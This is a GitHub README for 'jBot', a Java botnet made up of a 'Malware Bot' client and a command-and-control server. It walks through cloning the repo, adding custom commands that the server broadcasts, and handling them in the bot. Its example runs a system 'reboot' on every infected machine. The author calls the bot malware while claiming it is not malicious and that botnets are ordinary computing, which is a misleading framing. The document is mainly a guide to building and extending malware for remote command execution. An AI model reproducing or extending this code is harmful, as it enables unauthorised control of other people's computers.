*is jBot Malicious? No. jBot is an implementation of a Botnet in Java that was designed for developers to create their own botnets, as botnets are the future of large-scale computing, botnets are used widely across the world for many different things, and are used by some of your favorite companies.*
# jBot
jBot is the future of Java Botnet Development, the developed software allows java developers to create their own botnet, by adding commands, and more functionality to the initial botnet, as it was developed with ease of development in mind for less 'inclined' developers (No Offence).

## Get Started >
Begin by cloning/downloading this GitHub Repository, this will give you access to the Botnet Malware (Bot), and the Botnet Command and Control (CNC) Servers/Software.

    $ git clone https://github.com/Aaron-Akhtar/jBot.git

You can then process the projects into your code editor, and begin adding some custom commands and functionality to the botnet, as seen below.

### Adding Custom Commands and Functionality >
jBot uses something called Reflections, this allows the (CNC) software to dynamically find commands you've added to the project, so there is literally one 1 file/class that needs to be made and modified for you to add a custom command to the initial CNC Software, however you will need to add functionality for the actual bots (If your command is sending data to the bots), because, if you don't, the bots won't know what to do.

Start by Creating a Class & Implementing the interface [JBotCommand.java](https://github.com/Aaron-Akhtar/jBot/blob/main/jBot%20-%20Command%20and%20Control/src/main/java/me/aaronakhtar/jbot/command_manager/JBotCommand.java). 
**MAKE SURE TO LOCATE YOUR NEW COMMAND CLASS INTO THE FOLLOWING PROJECT PACKAGE/DIRECTORY:** `me.aaronakhtar.jbot.command_manager.commands`
Example Command Class:

```java
package me.aaronakhtar.jbot.command_manager.commands;  
  
import me.aaronakhtar.jbot.command_manager.JBotCommand;  
import me.aaronakhtar.jbot.threads.handlers.ClientHandler;  
  
import java.io.BufferedReader;  
import java.io.BufferedWriter;  
  
public class RandomCommand implements JBotCommand {  
  
    @Override  
  public String getCommand() {  
        return "myCommand";  
  }  
  
    @Override  
  public String getDescription() {  
        return "use this command to send a virtual slap to all bots.";  
  }  
  
    @Override  
  public boolean isAdminCommand() {  
        return false;  
  }  
  
    @Override  
  public void doAction(String[] args, ClientHandler client, BufferedWriter out, BufferedReader in) throws Exception {  
        // do something here when CNC-CLIENT executes command.  
  }  
}
```
If your command has **NO BOT-FUNCTIONALITY**, then, congrats, you've made your first CNC Command.
Whenever a CNC-CLIENT executes your command, whatever is in `doAction(...)` will be executed.

### Integrating your new command with your Bot (Malware) >
Because of the ease-of-usage concept I want to go by, I decided to make the Malware simple, and not over complicated at all, in order to integrate your new command, simply **make sure you add the following code into your Command Class `doAction(...)` function in the CNC Software:  `Utilities.executeCommandToNetwork("command here");`**

In your Malware [Main.java](https://github.com/Aaron-Akhtar/jBot/blob/main/jBot%20-%20Malware%20Bot/src/main/java/me/aaronakhtar/jbot/Main.java) class, simply modify the switch-statement to integrate your new command, and provide some functionality, below is an example implementation:
```java
switch (commandArgs[0].toLowerCase(Locale.ROOT)){  
    // example  
  case "ping":{  
     System.out.println("pong");  
     break;  
  }  
  
  case "myCommand":{  
     Runtime.getRuntime().exec("reboot");  
     break;  
  }  
}
```
As you can see, we are executing the `reboot` command in all the bots on our network once receiving the new command we just added to our CNC.


## Compiling the Software >
Once you've modified your version of jBot, you can compile it with Git Bash using the following commands:
*Prerequisites*:
```
	- Apache Maven (Installation Tutorial > https://www.youtube.com/watch?v=km3tLti4TCM)
```
*Step 1*: Go into your CNC Project Folder (The folder with `pom.xml` in it) and execute the following command:
```
$ mvn clean package
```
or
```
mvn package
```
*Step 2*: Go into your Malware (Bot) Project Folder (The folder with `pom.xml` in it) and execute the following command:
```
$ mvn clean package
```
or
```
mvn package
```

**Ladies and Gentlemen**, that is how you create a damn Java Botnet.

# Credits:
Me.
https://twitter.com/D3vAaron
